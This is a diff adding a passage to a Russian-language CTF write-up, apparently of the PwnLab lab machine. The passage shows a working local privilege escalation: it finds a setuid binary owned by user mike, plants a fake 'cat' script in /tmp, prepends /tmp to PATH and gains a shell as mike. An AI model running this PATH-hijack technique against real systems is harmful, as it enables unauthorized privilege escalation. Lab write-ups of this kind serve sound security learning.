@@ -662,6 +662,36 @@ ii  gcc-4.9                       4.9.2-10                    i386         GNU C
 /usr/bin/gcc
 ```
 
+95% векторов атаки не нашлось, запускал для разных пользователей.
+У пользователя `kane` обнаружил следующее  
+```bash
+╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
+-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 /home/kane/msgmike
+```
+
+Выполнение дало ошибку:
+```bash
+kane@pwnlab:/tmp$ /home/kane/msgmike
+/home/kane/msgmike
+cat: /home/mike/msg.txt: No such file or directory
+```
+
+Проверяю уязвимость в `$PATH` и получаю оболочку от `mike`  
+```bash
+kane@pwnlab:/tmp$ echo '/bin/bash' > cat
+kane@pwnlab:/tmp$ chmod 777 cat
+kane@pwnlab:/tmp$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+kane@pwnlab:/tmp$ export PATH=/tmp:$PATH
+kane@pwnlab:/tmp$ echo $PATH
+/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+kane@pwnlab:/tmp$ /home/kane/msgmike
+mike@pwnlab:/tmp$ id
+id
+uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
+mike@pwnlab:/tmp$ 
+
+```
 
 
 ## 🏁 Флаги
